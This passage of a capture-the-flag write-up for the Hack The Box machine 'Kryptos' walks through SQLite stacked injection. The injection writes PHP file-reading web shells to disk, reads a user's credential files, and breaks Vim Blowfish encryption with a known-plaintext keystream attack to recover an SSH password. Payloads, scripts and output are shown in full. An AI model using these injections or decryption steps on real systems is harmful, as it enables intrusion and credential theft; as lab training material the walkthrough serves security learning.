<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&amp;bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%27%29%3b</span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;CREATE TABLE test.pwn (dataz text);INSERT INTO test.pwn (dataz) VALUES ('<span class="php"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span>');</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Then I requested :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;d9e28afcf0b274a5e0542abb67db0784&#x2F;test.php</span><br></pre></td></tr></table></figure>
<p>and got the <code>phpinfo</code> page. It’s a very long page, I opened it in <code>firefox</code> and here’s the disabled functions part :<br><img src="/images/hackthebox/kryptos/17.png" alt=""><br>Almost any function that can get us code execution is disabled, but <code>scandir()</code> and <code>file_get_contents()</code> aren’t disabled, I wrote a <code>php</code> file that takes <code>file</code> and <code>dir</code> parameters to read a file or list a directory.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">"$_GET[dir]"</span>)); print_r(file_get_contents(<span class="string">"$_GET[file]"</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&amp;bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%72%69%6e%74%5f%72%28%73%63%61%6e%64%69%72%28%22%24%5f%47%45%54%5b%64%69%72%5d%22%29%29%3b%20%70%72%69%6e%74%5f%72%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%3f%3e%27%29%3b                                                                                </span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/rick.php' AS rick;CREATE TABLE rick.pwn (dataz text);INSERT INTO rick.pwn (dataz) VALUES ('<span class="php"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">"$_GET[dir]"</span>)); print_r(file_get_contents(<span class="string">"$_GET[file]"</span>)); <span class="meta">?&gt;</span></span>');</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Let’s test :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http:<span class="comment">//127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=./</span></span><br><span class="line">[*] Result :</span><br><span class="line">V3ArraypwnpwnCREATE TABLE pwn (dataz text)</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; books.db</span><br><span class="line">    [<span class="number">3</span>] =&gt; rick.php</span><br><span class="line">    [<span class="number">4</span>] =&gt; test.php</span><br><span class="line">)</span><br><span class="line">[?] URL : http:<span class="comment">//127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=./rick.php</span></span><br><span class="line">[*] Result :</span><br><span class="line">V3<span class="meta">&lt;?php</span> print_r(scandir(<span class="string">"$_GET[dir]"</span>)); print_r(file_get_contents(<span class="string">"$_GET[file]"</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>It’s working fine, but as you can see it prints some weird characters which i guess are caused by the <code>sqlite</code> query.<br>In <code>/home</code> there was a directory for a user called <code>rijndael</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http:<span class="comment">//127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=/home</span></span><br><span class="line">[*] Result :</span><br><span class="line">V3ArraypwnpwnCREATE TABLE pwn (dataz text)</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; rijndael</span><br><span class="line">)</span><br><span class="line">[?] URL : http:<span class="comment">//127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=/home/rijndael</span></span><br><span class="line">[*] Result :</span><br><span class="line">V3ArraypwnpwnCREATE TABLE pwn (dataz text)</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; .bash_history</span><br><span class="line">    [<span class="number">3</span>] =&gt; .bash_logout</span><br><span class="line">    [<span class="number">4</span>] =&gt; .bashrc</span><br><span class="line">    [<span class="number">5</span>] =&gt; .cache</span><br><span class="line">    [<span class="number">6</span>] =&gt; .gnupg</span><br><span class="line">    [<span class="number">7</span>] =&gt; .profile</span><br><span class="line">    [<span class="number">8</span>] =&gt; .ssh</span><br><span class="line">    [<span class="number">9</span>] =&gt; creds.old</span><br><span class="line">    [<span class="number">10</span>] =&gt; creds.txt</span><br><span class="line">    [<span class="number">11</span>] =&gt; kryptos</span><br><span class="line">    [<span class="number">12</span>] =&gt; user.txt</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>I couldn’t read <code>user.txt</code> or go to the ssh directory, but I could read <code>creds.txt</code> and <code>creds.old</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;d9e28afcf0b274a5e0542abb67db0784&#x2F;rick.php?file&#x3D;&#x2F;home&#x2F;rijndael&#x2F;creds.old</span><br><span class="line">[*] Result :</span><br><span class="line">V3rijndael &#x2F; Password1BLE pwn (dataz text)</span><br><span class="line">[?] URL : http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;d9e28afcf0b274a5e0542abb67db0784&#x2F;rick.php?file&#x3D;&#x2F;home&#x2F;rijndael&#x2F;creds.txt</span><br><span class="line">[*] Result :</span><br><span class="line">V3VimCrypt~02!REATE TABLE pwn (dataz text)</span><br><span class="line">vnd]KyYC&#125;56gMRAn[?] URL :</span><br></pre></td></tr></table></figure>
<p>I copied both of these files from my directory (<code>ssrf</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cp ssrf&#x2F;OUTPUT_19 .&#x2F;creds.old</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cp ssrf&#x2F;OUTPUT_20 .&#x2F;creds.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cat creds.old</span><br><span class="line">V3rijndael &#x2F; Password1BLE pwn (dataz text)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cat creds.txt</span><br><span class="line">V3VimCrypt~02!REATE TABLE pwn (dataz text)</span><br><span class="line">vnd]KyYC&#125;56gMRAn</span><br></pre></td></tr></table></figure>
<p>But because of that weird characters thing the files were partially damaged, so I wrote another php <code>file</code> to print the base-64 encoded value of the file between a bunch of newlines :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"\n\n\n\n\n"</span>; <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"$_GET[file]"</span>)); <span class="keyword">echo</span> <span class="string">"\n\n\n\n\n"</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&amp;bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%32%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%3b%20%65%63%68%6f%20%62%61%73%65%36%34%5f%65%6e%63%6f%64%65%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%20%3f%3e%27%29%3b                             </span><br><span class="line">[*] Result :</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/rick2.php' AS rick;CREATE TABLE rick.pwn (dataz text);INSERT INTO rick.pwn (dataz) VALUES ('<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"\n\n\n\n\n"</span>; <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"$_GET[file]"</span>)); <span class="keyword">echo</span> <span class="string">"\n\n\n\n\n"</span> <span class="meta">?&gt;</span></span>');</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[?] URL : http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;d9e28afcf0b274a5e0542abb67db0784&#x2F;rick2.php?file&#x3D;&#x2F;home&#x2F;rijndael&#x2F;creds.txt</span><br><span class="line">[*] Result :</span><br><span class="line">fStablepwnpwnCREATE TABLE pwn (dataz text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[?] URL :</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu | base64 -d &gt; creds.txt </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cat creds.txt </span><br><span class="line">VimCrypt~02!</span><br><span class="line">vnd]KyYC&#125;56gMRAnroot@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# file creds.txt </span><br><span class="line">creds.txt: Vim encrypted file data</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos#</span><br></pre></td></tr></table></figure>


<h2 id="Decrypting-the-Credentials-User-Flag"><a href="#Decrypting-the-Credentials-User-Flag" class="headerlink" title="Decrypting the Credentials, User Flag"></a>Decrypting the Credentials, User Flag</h2><p>The old credentials : <code>rijndael / Password1</code> didn’t work with ssh.<br>And the new credentials are encrypted :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# file creds.txt </span><br><span class="line">creds.txt: Vim encrypted file data</span><br></pre></td></tr></table></figure>
<p>I searched about how <code>vim</code> encrypts files and if there were any known vulnerabilities. I found this <a href="https://dgl.cx/2014/10/vim-blowfish" target="_blank" rel="noopener">article</a> which was talking about a weakness in this encryption system.<br>I won’t repeat what was said in the article but these are the important parts :</p>
<blockquote>
<p>The Vim editor has two modes of encryption. The old pkzip based system (which is broken, but still the default for compatiblity reasons) and the new (as of Vim 7.3) blowfish based system.</p>
</blockquote>
<blockquote>
<p>Blowfish is a block cipher, this means it encrypts a block of data at a time. There is no state kept between blocks, this is important to understand; it means the same input will result in the same output (if the key is the same).</p>
</blockquote>
<blockquote>
<p>the issue is that Vim actually ends up using the same IV for the first 8 blocks (essentially repeating the first part of the diagram 8 times, then going on to the next operation that mixes in the output). So the result is something like CFB but with the first 64 bytes lacking any protection.</p>
</blockquote>
<blockquote>
<p>The way CFB works is to compute a stream of data (the keystream), then XOR it with the plaintext. However Vim is reusing the keystream, in pseudocode:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keystream &#x3D; Blowfish(iv)</span><br><span class="line">ciphertext1 &#x3D; XOR(keystream, plaintext[0:7])</span><br><span class="line">ciphertext2 &#x3D; XOR(keystream, plaintext[8:15])</span><br></pre></td></tr></table></figure>

<p>This means by a simple relationship we can recover the keystream:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keystream &#x3D; XOR(ciphertext1, plaintext[0:7])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>With this information I started testing some stuff. We have <code>creds.old</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rijndael &#x2F; Password1</span><br></pre></td></tr></table></figure>
<p>As you can see <code>rijndael</code> which is the username might be also present in the encrypted file as the first 8 bytes. So I tried using <code>rijndael</code> as the known plaintext.<br>In python I opened the file for reading :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"./creds.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure>
<p>We don’t need the first 28 bytes : 12 bytes for the header (<code>VimCrypt~02!</code>) + 8 bytes for the salt + 8 bytes for the <code>IV</code>. So I stored them in a variable that I won’t use :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">... </span>    temp = f.read(<span class="number">28</span>)</span><br></pre></td></tr></table></figure>
<p>Then we have about 4 blocks left (each block 8 bytes) :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos<span class="meta"># xxd creds.txt</span></span><br><span class="line"><span class="number">00000000</span>: <span class="number">5669</span> <span class="number">6</span>d43 <span class="number">7279</span> <span class="number">7074</span> <span class="number">7e30</span> <span class="number">3221</span> <span class="number">0b1</span>8 e435  VimCrypt~<span class="number">02</span>!..<span class="number">.5</span></span><br><span class="line"><span class="number">00000010</span>: cb56 <span class="number">129</span>a <span class="number">3544</span> <span class="number">8040</span> <span class="number">703b</span> <span class="number">962</span>d <span class="number">930</span>d a810  .V.<span class="number">.5</span>D.@p;.-....</span><br><span class="line"><span class="number">00000020</span>: <span class="number">766</span>e <span class="number">645</span>d c14b e21c <span class="number">7959</span> <span class="number">437</span>d d935 fb36  vnd].K..yYC&#125;<span class="number">.5</span><span class="number">.6</span></span><br><span class="line"><span class="number">00000030</span>: <span class="number">674</span>d <span class="number">5241</span> <span class="number">8b</span>6e                           gMRA.n</span><br></pre></td></tr></table></figure>
<p>So I read them :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">... </span>    block1 = f.read(<span class="number">8</span>)</span><br><span class="line"><span class="meta">... </span>    block2 = f.read(<span class="number">8</span>)</span><br><span class="line"><span class="meta">... </span>    block3 = f.read(<span class="number">8</span>)</span><br><span class="line"><span class="meta">... </span>    block4 = f.read(<span class="number">8</span>)</span><br><span class="line"><span class="meta">... </span>    f.close()</span><br></pre></td></tr></table></figure>
<p>I used the same relation from the article to get the key :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keystream = XOR(ciphertext1, plaintext[<span class="number">0</span>:<span class="number">7</span>])</span><br></pre></td></tr></table></figure>
<p>I <code>XOR</code>ed the plaintext (<code>rijndael</code>) with the first block :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(block1, <span class="string">'rijndael'</span>))</span><br></pre></td></tr></table></figure>
<p>Then I tried to decode the first 2 blocks with the retrieved key and it worked successfully :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(block1, key))</span><br><span class="line">rijndael</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(block2, key))</span><br><span class="line">/ bkVBL</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>After my testing was successful I wrote this script which does it automatically :<br><code>vim-decrypt.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[-] Usage: &#123;&#125; &lt;encrypted file&gt; &lt;plaintext&gt; "</span>.format(sys.argv[<span class="number">0</span>])</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line">file = sys.argv[<span class="number">1</span>]</span><br><span class="line">plaintext = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(string,key)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(string, key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(file,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	</span><br><span class="line">	temp = f.read(<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line">	block1 = f.read(<span class="number">8</span>)</span><br><span class="line">	block2 = f.read(<span class="number">8</span>)</span><br><span class="line">	block3 = f.read(<span class="number">8</span>)</span><br><span class="line">	block4 = f.read(<span class="number">8</span>)</span><br><span class="line">	</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">key = xor(block1, plaintext)</span><br><span class="line"></span><br><span class="line">final = <span class="string">""</span></span><br><span class="line">final += xor(block1, key)</span><br><span class="line">final += xor(block2, key)</span><br><span class="line">final += xor(block3, key)</span><br><span class="line">final += xor(block4, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Decrypted: \n"</span></span><br><span class="line"><span class="keyword">print</span> final</span><br></pre></td></tr></table></figure>
<p>I got the credentials :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# .&#x2F;vim-decrypt.py .&#x2F;creds.txt rijndael</span><br><span class="line">[+] Decrypted: </span><br><span class="line"></span><br><span class="line">rijndael &#x2F; bkVBL8Q9HuBSpj</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos#</span><br></pre></td></tr></table></figure>
<p>Then I could ssh into the box as <code>rijndael</code> :<br><img src="/images/hackthebox/kryptos/18.png" alt=""><br>We owned user.</p>
<h2 id="kryptos-py-Analysis"><a href="#kryptos-py-Analysis" class="headerlink" title="kryptos.py: Analysis"></a>kryptos.py: Analysis</h2><p>In the home directory of <code>rijndael</code> there was a directory called <code>kryptos</code> which had a python script called <code>kryptos.py</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">rijndael@kryptos:~$ ls -la</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 6 rijndael rijndael 4096 Mar 13  2019 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Oct 30  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root     root        9 Oct 31  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 root     root      220 Oct 30  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 root     root     3771 Oct 30  2018 .bashrc</span><br><span class="line">drwx------ 2 rijndael rijndael 4096 Mar 13  2019 .cache</span><br><span class="line">-rw-rw-r-- 1 root     root       21 Oct 30  2018 creds.old</span><br><span class="line">-rw-rw-r-- 1 root     root       54 Oct 30  2018 creds.txt</span><br><span class="line">drwx------ 3 rijndael rijndael 4096 Mar 13  2019 .gnupg</span><br><span class="line">drwx------ 2 rijndael rijndael 4096 Mar 13  2019 kryptos</span><br><span class="line">-rw-r--r-- 1 root     root      807 Oct 30  2018 .profile</span><br><span class="line">drwx------ 2 rijndael rijndael 4096 Oct 31  2018 .ssh</span><br><span class="line">-r-------- 1 rijndael rijndael   33 Oct 30  2018 user.txt</span><br><span class="line">rijndael@kryptos:~$ cd kryptos&#x2F;</span><br><span class="line">rijndael@kryptos:~&#x2F;kryptos$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 rijndael rijndael 4096 Mar 13  2019 .</span><br><span class="line">drwxr-xr-x 6 rijndael rijndael 4096 Mar 13  2019 ..</span><br><span class="line">-r-------- 1 rijndael rijndael 2257 Mar 13  2019 kryptos.py</span><br><span class="line">rijndael@kryptos:~&#x2F;kryptos$</span><br></pre></td></tr></table></figure>
<p>I downloaded the script on my machine :</p>
